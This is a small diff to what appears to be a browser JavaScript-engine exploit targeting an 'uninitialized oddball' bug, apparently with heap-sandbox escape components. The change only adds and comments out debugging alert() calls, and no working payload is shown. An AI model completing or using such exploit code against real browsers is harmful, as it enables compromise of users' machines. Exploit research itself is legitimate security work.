@@ -115,6 +115,7 @@ class Helpers {
 */
 function UninitializedOddballExploiter(uninitialized_oddball) {
     var helpers = new Helpers();
+    alert(typeof(uninitialized_oddball));
     let caged_ab = new ArrayBuffer(0x1000);
     let caged_dv = null;
     let sbx_dv = null;
@@ -653,9 +654,9 @@ function main() {
         // console.log("1");
         // window.location.reload();
     }
-    else{
-      alert(typeof(glob_uninitialized_oddball));
-    }
+    // else{
+      // alert(typeof(glob_uninitialized_oddball));
+    // }
     UninitializedOddballExploiter(glob_uninitialized_oddball); 
 }
 
